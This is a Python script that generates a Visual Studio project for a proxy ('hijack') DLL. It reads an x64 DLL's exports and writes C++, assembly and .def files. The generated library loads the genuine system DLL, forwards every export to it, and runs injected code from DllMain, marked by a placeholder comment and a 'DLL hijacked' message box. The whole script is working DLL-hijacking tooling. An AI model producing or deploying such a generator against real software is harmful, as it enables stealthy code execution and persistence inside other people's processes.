#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import List, Tuple
import pefile as pe
import os.path as op
from sys import argv, exit
from os import mkdir


def prepare_main(exports: List[Tuple[int, str]], libname: str) -> str:
    main_code = """\
#include <Windows.h>

extern "C" UINT_PTR ProcList[{count}] = {{0}};

""".format(count=len(exports))

    for export in exports:
        main_code += """\
extern "C" void {name}_wrapper(void);
""".format(name=export[1])

    main_code += """\

LPCSTR ImportNames[] = {
"""

    for export in exports:
        main_code += """\
    "{name}",
""".format(name=export[1])

    main_code += """\
};

TCHAR lib_path[MAX_PATH];
HMODULE real_dll;

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved)
{
    DisableThreadLibraryCalls(instance);

    if (reason != DLL_PROCESS_ATTACH) {
        return TRUE;
    }

    GetSystemDirectory(lib_path, MAX_PATH);
"""

    main_code += """\
    lstrcat(lib_path, TEXT("\\\\{lib}"));
""".format(lib=libname)

    main_code += """\
    real_dll = LoadLibrary(lib_path);
    if (!real_dll) {
        MessageBoxA(NULL, "Can't load original DLL", "Error", NULL);
        return FALSE;
    }

    for (int i = 0; i < _countof(ImportNames); i++) {
        ProcList[i] = GetProcAddress(real_dll , ImportNames[i]);
    }

    // You can place your code here, as example:
    MessageBoxA(NULL, "DLL hijacked", "Success", NULL);

    return TRUE;
}
"""

    return main_code


def prepare_defs(exports: List[Tuple[int, str]]) -> str:
    defs_code = """\
LIBRARY
EXPORTS
"""

    for export in exports:
        defs_code += """\
{name}={name}_wrapper @{ordinal}
""".format(name=export[1], ordinal=export[0])

    return defs_code


def prepare_asm(exports: List[Tuple[int, str]]) -> str:
    asm_code = """\
.code
extern ProcList:QWORD
"""

    for i, export in enumerate(exports):
        asm_code += """\
{name}_wrapper proc
    jmp ProcList[{index} * 8]
{name}_wrapper endp
""".format(index=i, name=export[1])

    asm_code += """\
end
"""

    return asm_code


def prepare_vcxproj(libname: str, projname: str) -> str:
    with open("sample.vcxproj", "r") as f:
        result = f.read()

    result = result.replace("__ASM_LIB__", libname)
    result = result.replace("__PROJECT_NAME__", projname)
    result = result.replace("__PROJECT_NAME_U__",
                            projname.replace(" ", "_").upper())

    return result


if __name__ == "__main__":
    if len(argv) != 3:
        print("Usage: generate_hijack.py path_to_lib.dll VS_project_name")
        exit(-1)

    _, libpath, projname = argv

    if not op.isfile(libpath):
        print("DLL file {} not exist".format(libpath))
        exit(-1)

    dll = pe.PE(name=libpath, fast_load=False)

    if dll.FILE_HEADER.Machine != 0x8664:
        print("DLL file architecture is not x64")
        exit(-1)

    if not op.isdir(projname):
        mkdir(projname)

    tmp: List[Tuple[int, str]] = [
        (exp.ordinal, exp.name.decode("utf-8"))
        for exp in dll.DIRECTORY_ENTRY_EXPORT.symbols
        ]
    tmp.sort()

    libname = op.splitext(op.split(libpath)[1])[0]

    with open(op.join(projname, "main.cpp"), "w") as f:
        f.write(prepare_main(tmp, libname))

    with open(op.join(projname, libname + ".asm"),
              "w") as f:
        f.write(prepare_asm(tmp))

    with open(op.join(projname, "library.def"), "w") as f:
        f.write(prepare_defs(tmp))

    with open(op.join(projname, projname + ".vcxproj"), "w") as f:
        f.write(prepare_vcxproj(libname, projname))
